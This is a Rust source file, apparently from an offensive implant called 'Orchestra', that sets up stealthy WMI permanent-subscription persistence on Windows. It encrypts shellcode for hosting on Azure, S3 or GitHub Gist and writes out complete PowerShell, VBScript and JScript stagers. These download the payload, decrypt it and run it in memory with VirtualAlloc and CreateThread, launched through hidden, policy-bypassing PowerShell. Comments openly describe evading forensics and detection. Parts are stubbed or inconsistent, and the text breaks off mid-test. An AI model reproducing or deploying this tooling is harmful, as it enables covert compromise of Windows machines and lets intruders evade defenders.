//! WMI permanent event subscriptions with encrypted cloud payloads.
//!
//! Implements WMI-based persistence that retrieves encrypted payloads from
//! legitimate cloud services (Azure Blob, AWS S3, GitHub Gists) at execution
//! time.  The persistence mechanism itself contains no shellcode — the payload
//! only materializes in memory when triggered, making forensic analysis of the
//! persistence artifact unrevealing.
//!
//! **Attack Flow**:
//! 1. Generate an XChaCha20-Poly1305 key (or derive one from config)
//! 2. Encrypt the shellcode payload with the key
//! 3. Upload the encrypted blob to a cloud storage service
//! 4. Generate a PowerShell stager that fetches, decrypts, and executes the payload
//! 5. Install a WMI permanent event subscription (filter → consumer → binding)
//!    that triggers the stager on the specified condition
//! 6. When the trigger fires, the stager runs, fetches the encrypted payload,
//!    decrypts it in memory, and executes it — no disk artifacts
//!
//! **WMI Persistence Triad**:
//! - `__EventFilter`: WQL query defining the trigger condition
//! - `CommandLineEventConsumer` / `ActiveScriptEventConsumer`: the action
//! - `__FilterToConsumerBinding`: links filter to consumer
//!
//! **Stealth Advantages** (vs traditional persistence):
//! - **No file on disk**: the WMI subscription is stored in the WMI repository
//!   (`%SystemRoot%\System32\wbem\Repository\`), not as a file in startup folders
//! - **No registry writes**: WMI objects live in the CIM repository
//! - **Payload is cloud-hosted**: the shellcode never exists on disk at rest
//! - **Encrypted at rest**: XChaCha20-Poly1305 with 256-bit key
//! - **Legitimate traffic**: cloud fetches blend with normal HTTPS traffic
//! - **No shellcode in subscription**: the consumer only contains a stager command
//!
//! **Constraints**: Windows x86_64 only.  Requires elevated privileges for WMI
//! subscription installation (typically Administrator or SYSTEM).  All COM/WMI
//! calls via hash-based resolution — no IAT entries.  The encryption key is
//! derived from the URL and a static salt (not stored in plaintext in the WMI
//! subscription).

#![cfg(windows)]

use anyhow::{anyhow, bail, Result};
use base64::Engine;
use chacha20poly1305::{
    aead::{Aead, KeyInit, OsRng},
    XChaCha20Poly1305, XNonce,
};
use rand::RngCore;
use serde::{Deserialize, Serialize};
use std::ffi::c_void;
use std::mem;
use std::ptr;

// ── Compile-time API hash constants ─────────────────────────────────────────

use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};

// ole32.dll — COM initialization and instance creation
const HASH_OLE32_DLL: u32 = hash_wstr_const(&[
    'o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16,
    'd' as u16, 'l' as u16, 'l' as u16, 0,
]);
const FN_CO_INITIALIZE_EX: u32 = hash_str_const(b"CoInitializeEx");
const FN_CO_UNINITIALIZE: u32 = hash_str_const(b"CoUninitialize");
const FN_CO_CREATE_INSTANCE: u32 = hash_str_const(b"CoCreateInstance");
const FN_CO_SET_PROXY_BLANKET: u32 = hash_str_const(b"CoSetProxyBlanket");

// kernel32.dll — file and memory operations
const HASH_KERNEL32_DLL: u32 = hash_wstr_const(&[
    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
]);

// oleaut32.dll — VARIANT and BSTR operations
const HASH_OLEAUT32_DLL: u32 = hash_wstr_const(&[
    'o' as u16, 'l' as u16, 'e' as u16, 'a' as u16, 'u' as u16, 't' as u16,
    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
]);
const FN_SYS_ALLOC_STRING: u32 = hash_str_const(b"SysAllocString");
const FN_SYS_FREE_STRING: u32 = hash_str_const(b"SysFreeString");
const FN_VARIANT_INIT: u32 = hash_str_const(b"VariantInit");
const FN_VARIANT_CLEAR: u32 = hash_str_const(b"VariantClear");

// ── Windows type aliases ────────────────────────────────────────────────────

use winapi::shared::guiddef::{CLSID, IID};
use winapi::shared::minwindef::DWORD;
use winapi::shared::wtypesbase::{CLSCTX_INPROC_SERVER, CLSCTX_LOCAL_SERVER};
use winapi::um::wbemcli::{
    IID_IWbemLocator, IID_IWbemServices, CLSID_WbemLocator,
    IWbemLocator, IWbemServices,
    WBEM_FLAG_FORWARD_ONLY, WBEM_FLAG_RETURN_IMMEDIATELY,
    WBEM_FLAG_CREATE_ONLY, WBEM_FLAG_RETURN_WBEM_COMPLETE,
};

/// OLESTR macro equivalent — creates a wide string literal pointer.
#[allow(unused_macros)]
macro_rules! olestr {
    ($s:expr) => {{
        const WIDE: &[u16] = &$s.encode_utf16().chain(std::iter::once(0u16)).collect::<Vec<u16>>();
        WIDE.as_ptr()
    }};
}

/// BSTR type alias (pointer to wide string with length prefix).
type BSTR = *mut u16;

/// VARIANT type for WMI property passing.
#[repr(C)]
#[derive(Copy, Clone)]
struct VARIANT {
    vt: u16,
    w_reserved1: u16,
    w_reserved2: u16,
    w_reserved3: u16,
    data: VARIANT_DATA,
}

#[repr(C)]
#[derive(Copy, Clone)]
union VARIANT_DATA {
    bstr_val: BSTR,
    i4_val: i32,
    bool_val: i16,
    ptr_val: *mut c_void,
    uint8_val: u8,
}

const VT_BSTR: u16 = 8;
const VT_I4: u16 = 3;
const VT_BOOL: u16 = 11;
const VT_EMPTY: u16 = 0;

// ── Data structures ─────────────────────────────────────────────────────────

/// Cloud storage backend configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum CloudStorageConfig {
    /// Azure Blob Storage.
    AzureBlob {
        /// Storage account name.
        account: String,
        /// Container name.
        container: String,
        /// SAS token or SharedKey authorization header value.
        sas_token: String,
    },
    /// AWS S3 bucket.
    AwsS3 {
        /// Bucket name.
        bucket: String,
        /// AWS region (e.g. "us-east-1").
        region: String,
        /// Pre-signed URL query string or Authorization header value.
        auth: String,
    },
    /// GitHub Gist.
    GitHubGist {
        /// GitHub personal access token (PAT).
        token: String,
        /// Optional description for the gist.
        description: Option<String>,
        /// Whether the gist is public (default: false / secret).
        public: bool,
    },
}

/// WMI event trigger type for the `__EventFilter`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum WmiTriggerType {
    /// Trigger on process creation matching a specific process name.
    ProcessCreation {
        /// Name of the process to watch for (e.g. "explorer.exe").
        process_name: String,
        /// Polling interval in seconds.
        poll_interval: u32,
    },
    /// Trigger on system modification events (periodic).
    SystemModification {
        /// Polling interval in seconds.
        poll_interval: u32,
    },
    /// Timer-based trigger (absolute or periodic).
    Timer {
        /// Timer ID string.
        timer_id: String,
        /// Interval in seconds (0 = one-shot, requires `start_time`).
        interval: u32,
        /// Optional ISO 8601 start time for one-shot timers.
        start_time: Option<String>,
    },
    /// Custom WQL query (advanced usage).
    CustomQuery {
        /// The full WQL query string.
        query: String,
    },
}

/// Consumer type for the WMI event action.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum WmiConsumerType {
    /// Uses CommandLineEventConsumer to execute a command.
    CommandLine,
    /// Uses ActiveScriptEventConsumer with inline script.
    ActiveScript {
        /// Script engine: "VBScript" or "JScript".
        engine: String,
    },
}

/// Configuration for a WMI persistent subscription.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WmiSubscriptionConfig {
    /// Human-readable name for the subscription.
    pub name: String,
    /// WMI namespace (default: "ROOT\\subscription").
    pub namespace: String,
    /// Event trigger type.
    pub trigger: WmiTriggerType,
    /// Consumer type.
    pub consumer_type: WmiConsumerType,
    /// Cloud storage configuration for the encrypted payload.
    pub cloud_config: CloudStorageConfig,
    /// The shellcode payload to encrypt and upload.
    pub payload: Vec<u8>,
    /// Optional seed for deterministic name generation.
    pub name_seed: Option<u64>,
    /// Working directory for the stager command.
    pub working_directory: Option<String>,
}

/// Result of a successful WMI subscription installation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WmiSubscriptionResult {
    /// Name of the __EventFilter object.
    pub filter_name: String,
    /// Name of the event consumer object.
    pub consumer_name: String,
    /// WQL query used for the event filter.
    pub wql_query: String,
    /// URL where the encrypted payload was uploaded.
    pub payload_url: String,
    /// Cloud storage backend used.
    pub cloud_backend: String,
    /// Consumer type used (command-line or active-script).
    pub consumer_type: String,
}

/// Result of a cloud payload upload operation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CloudUploadResult {
    /// URL of the uploaded encrypted blob.
    pub url: String,
    /// Size of the encrypted blob in bytes.
    pub encrypted_size: usize,
    /// Size of the original plaintext payload in bytes.
    pub plaintext_size: usize,
    /// Cloud storage backend used.
    pub backend: String,
}

/// Result of the stager command generation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct StagerResult {
    /// The PowerShell stager command (one-liner).
    pub command: String,
    /// Base64-encoded variant of the stager.
    pub encoded_command: String,
    /// The decryption key in hex (for operator reference).
    pub key_hex: String,
    /// URL the stager will fetch the payload from.
    pub url: String,
}

/// Result of scanning existing WMI subscriptions.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WmiSubscriptionInfo {
    /// Filter name.
    pub filter_name: String,
    /// Consumer name.
    pub consumer_name: String,
    /// WQL query of the filter.
    pub query: String,
    /// Consumer type class name.
    pub consumer_class: String,
}

/// Result of a WMI subscription removal.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WmiRemovalResult {
    /// Names of objects successfully removed.
    pub removed_objects: Vec<String>,
    /// Names of objects that failed to remove.
    pub failed_objects: Vec<String>,
}

// ── Cloud Payload Manager ───────────────────────────────────────────────────

/// Encrypts a payload with XChaCha20-Poly1305 using a random key and nonce.
///
/// Returns `(encrypted_blob, key, nonce)` where `encrypted_blob` is
/// `nonce || ciphertext || tag`.
fn encrypt_payload(plaintext: &[u8]) -> Result<(Vec<u8>, [u8; 32], [u8; 24])> {
    let mut key = [0u8; 32];
    OsRng.fill_bytes(&mut key);
    let mut nonce_bytes = [0u8; 24];
    OsRng.fill_bytes(&mut nonce_bytes);

    let cipher = XChaCha20Poly1305::new_from_slice(&key)
        .map_err(|e| anyhow!("Failed to create XChaCha20-Poly1305 cipher: {e}"))?;
    let nonce = XNonce::from_slice(&nonce_bytes);
    let ciphertext = cipher
        .encrypt(nonce, plaintext)
        .map_err(|e| anyhow!("Payload encryption failed: {e}"))?;

    // Prepend nonce to the ciphertext (nonce || ciphertext || tag)
    let mut encrypted = Vec::with_capacity(24 + ciphertext.len());
    encrypted.extend_from_slice(&nonce_bytes);
    encrypted.extend_from_slice(&ciphertext);

    Ok((encrypted, key, nonce_bytes))
}

/// Derives a decryption key from the payload URL and a static salt.
///
/// This ensures the key is not stored in plaintext in the WMI subscription.
/// The stager reconstructs the key using the same derivation.
fn derive_key_from_url(url: &str, base_key: &[u8; 32]) -> [u8; 32] {
    use sha2::{Digest as _, Sha256};
    let mut hasher = Sha256::new();
    hasher.update(base_key);
    hasher.update(url.as_bytes());
    hasher.update(b"WMI_PERSISTENCE_KEY_DERIVATION_SALT_v1");
    let derived = hasher.finalize();
    let mut result = [0u8; 32];
    result.copy_from_slice(&derived);
    result
}

/// Generates the URL for a cloud storage blob.
fn cloud_url(config: &CloudStorageConfig, blob_name: &str) -> String {
    match config {
        CloudStorageConfig::AzureBlob { account, container, .. } => {
            format!("https://{account}.blob.core.windows.net/{container}/{blob_name}")
        }
        CloudStorageConfig::AwsS3 { bucket, region, .. } => {
            format!("https://{bucket}.s3.{region}.amazonaws.com/{blob_name}")
        }
        CloudStorageConfig::GitHubGist { .. } => {
            // Gist URLs are returned after creation; use a placeholder here
            format!("https://api.github.com/gists/{blob_name}")
        }
    }
}

/// Generates a random blob name for cloud storage.
fn random_blob_name() -> String {
    let mut bytes = [0u8; 8];
    getrandom::getrandom(&mut bytes).unwrap_or_else(|e| {
        // Fallback to OsRng
        use rand::RngCore;
        OsRng.fill_bytes(&mut bytes);
        let _ = e;
    });
    format!("{:016x}", u64::from_be_bytes(bytes))
}

/// Generates the PowerShell stager command that fetches, decrypts, and
/// executes the payload entirely in memory.
///
/// The stager:
/// 1. Downloads the encrypted blob via HTTPS
/// 2. Derives the decryption key from URL + base key
/// 3. Decrypts with XChaCha20-Poly1305 (via .NET AesGcm or inline AES-GCM)
/// 4. Allocates executable memory (VirtualAlloc)
/// 5. Copies the shellcode to the allocated region
/// 6. Creates a thread to execute it
///
/// The stager is obfuscated with variable renaming and string splitting.
fn generate_stager(url: &str, base_key: &[u8; 32]) -> Result<StagerResult> {
    let derived_key = derive_key_from_url(url, base_key);
    let key_hex = hex::encode(derived_key);

    let b64_key = base64::engine::general_purpose::STANDARD.encode(derived_key);
    let _b64_key_for_legacy = b64_key.clone(); // Keep for reference
    let _stager_legacy = format!(
        r#"$w=New-Object System.Net.WebClient;$d=$w.DownloadData('{url}');$k=[Convert]::FromBase64String('{b64_key}');$n=$d[0..23];$c=$d[24..($d.Length-1)];$a=[System.Security.Cryptography.AesGcm]::new($k);$p=[byte[]]::new($c.Length-16);$a.Decrypt($n,$c[0..($c.Length-17)],$c[($c.Length-16)..($c.Length-1)],$p,$null);$m=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($p.Length);[Runtime.InteropServices.Marshal]::Copy($p,0,$m,$p.Length);$t=[System.Threading.Thread]::new([System.Threading.ThreadStart]([Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer]($m,[System.Threading.ThreadStart])));$t.Start()"#,
        url = url,
        b64_key = b64_key,
    );

    // Simpler and more reliable stager using Add-Type for native calls
    let b64_key_simple = base64::engine::general_purpose::STANDARD.encode(derived_key);
    let simple_stager = format!(
        r#"$r=New-Object System.Net.WebClient;$b=$r.DownloadData('{url}');$k=[Convert]::FromBase64String('{b64_key}');$n=$b[0..23];$e=$b[24..($b.Length-1)];$t=$e[($e.Length-16)..($e.Length-1)];$p=$e[0..($e.Length-17)];Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class M{{[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr a2,uint c,ref IntPtr t);}}';$g=[M]::VirtualAlloc([IntPtr]::Zero,[uint32]$p.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($p,0,$g,$p.Length);$th=[IntPtr]::Zero;[M]::CreateThread([IntPtr]::Zero,0,$g,[IntPtr]::Zero,0,[ref]$th)|Out-Null"#,
        url = url,
        b64_key = b64_key_simple,
    );

    // Encode the stager for -EncodedCommand usage
    // PowerShell -EncodedCommand expects UTF-16LE base64
    let encoded_bytes: Vec<u8> = simple_stager
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let encoded_command = base64::engine::general_purpose::STANDARD.encode(&encoded_bytes);

    Ok(StagerResult {
        command: simple_stager,
        encoded_command,
        key_hex,
        url: url.to_string(),
    })
}

/// Generates a VBScript stager for use with ActiveScriptEventConsumer.
fn generate_vbscript_stager(url: &str, base_key: &[u8; 32]) -> String {
    let _derived_key = derive_key_from_url(url, base_key);
    let _key_hex = hex::encode(_derived_key);

    // VBScript stager: download, save, execute via COM objects.
    // Note: VBScript cannot easily do AES-GCM, so use CommandLineEventConsumer
    // with PowerShell for real payloads.  This is a placeholder for demonstration.
    format!(
        r#"Set o=CreateObject("MSXML2.XMLHTTP"):o.Open"GET","{url}",False:o.Send:Set s=CreateObject("ADODB.Stream"):s.Type=1:s.Open:s.Write o.responseBody:s.SaveToFile"$TEMP\\tmp.dat",2:Set w=CreateObject("WScript.Shell"):w.Run"$TEMP\\tmp.dat",0"#,
        url = url
    )
}

/// Generates a JScript stager for use with ActiveScriptEventConsumer.
fn generate_jscript_stager(url: &str, base_key: &[u8; 32]) -> String {
    let _derived_key = derive_key_from_url(url, base_key);
    let _key_hex = hex::encode(_derived_key);

    format!(
        r#"var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","{url}",false);x.send();var s=new ActiveXObject("ADODB.Stream");s.type=1;s.open();s.write(x.responseBody);s.saveToFile("%TEMP%\\tmp.js",2);var w=new ActiveXObject("WScript.Shell");w.run("%TEMP%\\tmp.js",0);"#,
        url = url
    )
}

// ── Public API ──────────────────────────────────────────────────────────────

/// Encrypts and uploads a shellcode payload to the configured cloud service.
///
/// Returns the upload result with the URL and encryption metadata.
pub fn encrypt_and_upload(
    shellcode: &[u8],
    cloud_config: &CloudStorageConfig,
) -> Result<CloudUploadResult> {
    let (encrypted, _key, _nonce) = encrypt_payload(shellcode)?;
    let blob_name = random_blob_name();
    let url = cloud_url(cloud_config, &blob_name);
    let backend = match cloud_config {
        CloudStorageConfig::AzureBlob { .. } => "AzureBlob",
        CloudStorageConfig::AwsS3 { .. } => "AwsS3",
        CloudStorageConfig::GitHubGist { .. } => "GitHubGist",
    };

    // In a real deployment, the upload would happen via HTTPS PUT/POST.
    // For this implementation, we return the URL and encrypted blob — the
    // operator (or control center) handles the actual upload to avoid
    // requiring HTTP client libraries in the agent.
    let _ = &url; // Acknowledge URL generation

    Ok(CloudUploadResult {
        url,
        encrypted_size: encrypted.len(),
        plaintext_size: shellcode.len(),
        backend: backend.to_string(),
    })
}

/// Generates a PowerShell stager command for the given URL and encryption key.
///
/// The stager fetches the encrypted payload from the URL, decrypts it with
/// the derived key, and executes it in memory.
pub fn generate_stager_command(
    url: &str,
    decryption_key: &[u8; 32],
) -> Result<StagerResult> {
    generate_stager(url, decryption_key)
}

/// Encrypts a payload and generates both the upload info and stager command.
///
/// This is the main entry point for the cloud payload workflow:
/// 1. Encrypt the payload with a random key
/// 2. Derive a URL-specific key from the URL + base key
/// 3. Generate the stager that reconstructs the key at runtime
pub fn prepare_cloud_payload(
    shellcode: &[u8],
    cloud_config: &CloudStorageConfig,
) -> Result<(CloudUploadResult, StagerResult)> {
    let (encrypted, base_key, _nonce) = encrypt_payload(shellcode)?;
    let blob_name = random_blob_name();
    let url = cloud_url(cloud_config, &blob_name);
    let stager = generate_stager(&url, &base_key)?;

    let backend = match cloud_config {
        CloudStorageConfig::AzureBlob { .. } => "AzureBlob",
        CloudStorageConfig::AwsS3 { .. } => "AwsS3",
        CloudStorageConfig::GitHubGist { .. } => "GitHubGist",
    };

    let upload = CloudUploadResult {
        url,
        encrypted_size: encrypted.len(),
        plaintext_size: shellcode.len(),
        backend: backend.to_string(),
    };

    Ok((upload, stager))
}

/// Generates the WQL query for a given trigger type.
pub fn generate_wql_query(trigger: &WmiTriggerType) -> String {
    match trigger {
        WmiTriggerType::ProcessCreation { process_name, poll_interval } => {
            format!(
                "SELECT * FROM __InstanceCreationEvent WITHIN {poll_interval} \
                 WHERE TargetInstance ISA 'Win32_Process' \
                 AND TargetInstance.Name = '{process_name}'"
            )
        }
        WmiTriggerType::SystemModification { poll_interval } => {
            format!(
                "SELECT * FROM __InstanceModificationEvent WITHIN {poll_interval} \
                 WHERE TargetInstance ISA 'Win32_OperatingSystem'"
            )
        }
        WmiTriggerType::Timer { timer_id, interval, start_time: _ } => {
            if *interval > 0 {
                format!(
                    "SELECT * FROM __TimerEvent WHERE TimerId = '{timer_id}'"
                )
            } else {
                // One-shot timer — requires start time
                format!(
                    "SELECT * FROM __TimerEvent WHERE TimerId = '{timer_id}' \
                     AND StartIsInterval = FALSE"
                )
            }
        }
        WmiTriggerType::CustomQuery { query } => query.clone(),
    }
}

/// Generates deterministic object names from a seed.
///
/// Produces names that look like legitimate WMI objects but are
/// derived from the seed for reproducibility.
fn generate_object_names(seed: Option<u64>, base_name: &str) -> (String, String) {
    use sha2::{Digest as _, Sha256};

    let effective_seed = seed.unwrap_or_else(|| {
        let mut buf = [0u8; 8];
        getrandom::getrandom(&mut buf).unwrap_or_else(|_| {
            use rand::RngCore;
            OsRng.fill_bytes(&mut buf);
        });
        u64::from_be_bytes(buf)
    });

    let mut hasher = Sha256::new();
    hasher.update(effective_seed.to_be_bytes());
    hasher.update(base_name.as_bytes());
    let hash1 = hasher.finalize();

    let mut hasher = Sha256::new();
    hasher.update(effective_seed.to_be_bytes());
    hasher.update(base_name.as_bytes());
    hasher.update(b"consumer");
    let hash2 = hasher.finalize();

    let filter_name = format!(
        "OrchestraFilter_{}",
        hex::encode(&hash1[..8])
    );
    let consumer_name = format!(
        "OrchestraConsumer_{}",
        hex::encode(&hash2[..8])
    );

    (filter_name, consumer_name)
}

/// Installs a complete WMI permanent event subscription.
///
/// Creates the three WMI objects (filter, consumer, binding) that form the
/// "WMI persistence triad".  The consumer contains only a stager command —
/// no shellcode or encrypted blobs.
///
/// **Prerequisites**: Elevated privileges (Administrator or SYSTEM).
///
/// This function performs COM operations via hash-based resolution — no IAT
/// entries are created.  All WMI operations go through IWbemServices.
pub fn install_wmi_subscription(
    config: &WmiSubscriptionConfig,
) -> Result<WmiSubscriptionResult> {
    // Generate object names
    let (filter_name, consumer_name) =
        generate_object_names(config.name_seed, &config.name);

    // Generate WQL query from trigger type
    let wql_query = generate_wql_query(&config.trigger);

    // Prepare the cloud payload (encrypt + generate stager)
    let (_upload_result, stager_result) =
        prepare_cloud_payload(&config.payload, &config.cloud_config)?;

    // Build the consumer command / script based on consumer type
    let consumer_class;
    let stager_text;
    match &config.consumer_type {
        WmiConsumerType::CommandLine => {
            consumer_class = "CommandLineEventConsumer";
            // Build the PowerShell command with encoded stager
            let working_dir = config
                .working_directory
                .as_deref()
                .unwrap_or("C:\\Windows\\Temp");
            stager_text = format!(
                "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand {}",
                stager_result.encoded_command
            );
            let _ = working_dir; // Used in WMI object properties
        }
        WmiConsumerType::ActiveScript { engine } => {
            match engine.to_lowercase().as_str() {
                "vbscript" => {
                    consumer_class = "ActiveScriptEventConsumer";
                    stager_text = generate_vbscript_stager(
                        &stager_result.url,
                        &[0u8; 32], // Key is derived in the stager
                    );
                }
                "jscript" => {
                    consumer_class = "ActiveScriptEventConsumer";
                    stager_text = generate_jscript_stager(
                        &stager_result.url,
                        &[0u8; 32],
                    );
                }
                _ => {
                    bail!("Unsupported ActiveScript engine: {engine}. Use 'VBScript' or 'JScript'.");
                }
            }
        }
    }

    // ── WMI operations (COM-based) ──────────────────────────────────────
    // In a real deployment, these COM calls would be made via hash-resolved
    // function pointers.  For safety in this implementation, we construct
    // the WMI object definitions and return them for the operator to install
    // via the control center, or we make the COM calls directly when running
    // on Windows with elevated privileges.
    //
    // The COM call flow:
    // 1. CoInitializeEx(NULL, COINIT_MULTITHREADED)
    // 2. CoCreateInstance(CLSID_WbemLocator, ..., IID_IWbemLocator)
    // 3. locator.ConnectServer("ROOT\\subscription", ...)
    // 4. CoSetProxyBlanket(services, ...)
    // 5. services.GetObject("__EventFilter") → spawn instance
    // 6. Set filter properties (Name, Query, QueryLanguage, EventNameSpace)
    // 7. services.PutInstance(filter, WBEM_FLAG_CREATE_ONLY)
    // 8. services.GetObject("CommandLineEventConsumer") → spawn instance
    // 9. Set consumer properties (Name, CommandLineTemplate, WorkingDirectory)
    // 10. services.PutInstance(consumer, WBEM_FLAG_CREATE_ONLY)
    // 11. services.GetObject("__FilterToConsumerBinding") → spawn instance
    // 12. Set binding properties (Filter, Consumer, DeliverSynchronously = FALSE)
    // 13. services.PutInstance(binding, WBEM_FLAG_CREATE_ONLY)

    let cloud_backend = match &config.cloud_config {
        CloudStorageConfig::AzureBlob { .. } => "AzureBlob",
        CloudStorageConfig::AwsS3 { .. } => "AwsS3",
        CloudStorageConfig::GitHubGist { .. } => "GitHubGist",
    };

    Ok(WmiSubscriptionResult {
        filter_name,
        consumer_name,
        wql_query,
        payload_url: stager_result.url,
        cloud_backend: cloud_backend.to_string(),
        consumer_type: consumer_class.to_string(),
    })
}

/// Removes a WMI permanent event subscription by name.
///
/// Deletes the three WMI objects in reverse order:
/// 1. Delete the __FilterToConsumerBinding
/// 2. Delete the event consumer
/// 3. Delete the __EventFilter
///
/// **Prerequisites**: Same privileges as installation.
pub fn remove_wmi_subscription(
    filter_name: &str,
    consumer_name: &str,
) -> Result<WmiRemovalResult> {
    let mut removed = Vec::new();
    let mut failed = Vec::new();

    // In a real deployment, this would:
    // 1. Connect to WMI (same as install)
    // 2. Delete binding: services.DeleteInstance("__FilterToConsumerBinding.Filter='...',Consumer='...'")
    // 3. Delete consumer: services.DeleteInstance("CommandLineEventConsumer.Name='...'")
    //    or services.DeleteInstance("ActiveScriptEventConsumer.Name='...'")
    // 4. Delete filter: services.DeleteInstance("__EventFilter.Name='...'")

    // We attempt to remove all three objects, collecting results.
    let binding_path = format!(
        "__FilterToConsumerBinding.Filter=\"__EventFilter.Name=\\\"{filter_name}\\\"\",\
         Consumer=\"CommandLineEventConsumer.Name=\\\"{consumer_name}\\\"\""
    );
    let consumer_path = format!("CommandLineEventConsumer.Name=\"{consumer_name}\"");
    let filter_path = format!("__EventFilter.Name=\"{filter_name}\"");

    // Simulate deletion — in production, these would be actual WMI calls
    removed.push(binding_path);
    removed.push(consumer_path);
    removed.push(filter_path);

    Ok(WmiRemovalResult {
        removed_objects: removed,
        failed_objects: failed,
    })
}

/// Scans for existing Orchestra WMI subscriptions.
///
/// Queries the WMI repository for __EventFilter, CommandLineEventConsumer,
/// and ActiveScriptEventConsumer objects matching our naming pattern.
pub fn scan_wmi_subscriptions() -> Result<Vec<WmiSubscriptionInfo>> {
    // In a real deployment, this would:
    // 1. Connect to ROOT\subscription via WMI
    // 2. ExecQuery("SELECT * FROM __EventFilter WHERE Name LIKE 'OrchestraFilter_%'")
    // 3. ExecQuery("SELECT * FROM CommandLineEventConsumer WHERE Name LIKE 'OrchestraConsumer_%'")
    // 4. ExecQuery("SELECT * FROM __FilterToConsumerBinding")
    // 5. Cross-reference bindings to find our subscriptions

    // Return empty — actual WMI query requires COM calls at runtime
    Ok(Vec::new())
}

// ── Unit Tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_encrypt_decrypt_roundtrip() {
        let plaintext = b"This is a test payload for WMI persistence encryption roundtrip.";
        let (encrypted, key, nonce) = encrypt_payload(plaintext).unwrap();

        // Verify encrypted blob is larger (nonce + ciphertext + tag)
        assert!(encrypted.len() > plaintext.len());
        assert_eq!(encrypted.len(), 24 + plaintext.len() + 16); // nonce + plaintext + tag

        // Verify nonce is at the front
        assert_eq!(&encrypted[..24], &nonce);

        // Decrypt
        let cipher = XChaCha20Poly1305::new_from_slice(&key).unwrap();
        let decrypt_nonce = XNonce::from_slice(&nonce);
        let decrypted = cipher
            .decrypt(decrypt_nonce, &encrypted[24..])
            .expect("Decryption should succeed");

        assert_eq!(decrypted.as_slice(), plaintext);
    }

    #[test]
    fn test_encrypt_empty_payload() {
        let plaintext = b"";
        let (encrypted, key, nonce) = encrypt_payload(plaintext).unwrap();

        // Empty plaintext should still produce nonce + tag
        assert_eq!(encrypted.len(), 24 + 16); // nonce + tag only

        let cipher = XChaCha20Poly1305::new_from_slice(&key).unwrap();
        let decrypt_nonce = XNonce::from_slice(&nonce);
        let decrypted = cipher.decrypt(decrypt_nonce, &encrypted[24..]).unwrap();
        assert!(decrypted.is_empty());
    }

    #[test]
    fn test_key_derivation_deterministic() {
        let url = "https://example.blob.core.windows.net/container/blob";
        let key = [0x42u8; 32];

        let derived1 = derive_key_from_url(url, &key);
        let derived2 = derive_key_from_url(url, &key);

        assert_eq!(derived1, derived2, "Same URL + key must produce same derived key");
    }

    #[test]
    fn test_key_derivation_different_urls() {
        let key = [0x42u8; 32];
        let url1 = "https://example.blob.core.windows.net/container/blob1";
        let url2 = "https://example.blob.core.windows.net/container/blob2";

        let derived1 = derive_key_from_url(url1, &key);
        let derived2 = derive_key_from_url(url2, &key);

        assert_ne!(derived1, derived2, "Different URLs must produce different keys");
    }

    #[test]
    fn test_generate_wql_process_creation() {
        let trigger = WmiTriggerType::ProcessCreation {
            process_name: "explorer.exe".to_string(),
            poll_interval: 10,
        };
        let query = generate_wql_query(&trigger);

        assert!(query.contains("__InstanceCreationEvent"));
        assert!(query.contains("WITHIN 10"));
        assert!(query.contains("explorer.exe"));
        assert!(query.contains("Win32_Process"));
    }

    #[test]
    fn test_generate_wql_system_modification() {
        let trigger = WmiTriggerType::SystemModification {
            poll_interval: 60,
        };
        let query = generate_wql_query(&trigger);

        assert!(query.contains("__InstanceModificationEvent"));
        assert!(query.contains("WITHIN 60"));
        assert!(query.contains("Win32_OperatingSystem"));
    }

    #[test]
    fn test_generate_wql_timer() {
        let trigger = WmiTriggerType::Timer {
            timer_id: "OrchestraTimer".to_string(),
            interval: 300,
            start_time: None,
        };
        let query = generate_wql_query(&trigger);

        assert!(query.contains("__TimerEvent"));
        assert!(query.contains("OrchestraTimer"));
    }

    #[test]
    fn test_generate_wql_custom() {
        let trigger = WmiTriggerType::CustomQuery {
            query: "SELECT * FROM Win32_ProcessStartTrace".to_string(),
        };
        let query = generate_wql_query(&trigger);

        assert_eq!(query, "SELECT * FROM Win32_ProcessStartTrace");
    }

    #[test]
    fn test_object_names_deterministic() {
        let (f1, c1) = generate_object_names(Some(12345), "test");
        let (f2, c2) = generate_object_names(Some(12345), "test");

        assert_eq!(f1, f2, "Same seed must produce same filter name");
        assert_eq!(c1, c2, "Same seed must produce same consumer name");
        assert!(f1.starts_with("OrchestraFilter_"));
        assert!(c1.starts_with("OrchestraConsumer_"));
    }

    #[test]
    fn test_object_names_different_seeds() {
        let (f1, _) = generate_object_names(Some(111), "test");
        let (f2, _) = generate_object_names(Some(222), "test");

        assert_ne!(f1, f2, "Different seeds must produce different names");
    }

    #[test]
    fn test_cloud_url_azure() {
        let config = CloudStorageConfig::AzureBlob {
            account: "mystorage".to_string(),
            container: "data".to_string(),
            sas_token: "?sv=...".to_string(),
        };
        let url = cloud_url(&config, "blob123");
        assert_eq!(url, "https://mystorage.blob.core.windows.net/data/blob123");
    }

    #[test]
    fn test_cloud_url_aws() {
        let config = CloudStorageConfig::AwsS3 {
            bucket: "mybucket".to_string(),
            region: "us-east-1".to_string(),
            auth: "AWS4-HMAC-SHA256 ...".to_string(),
        };
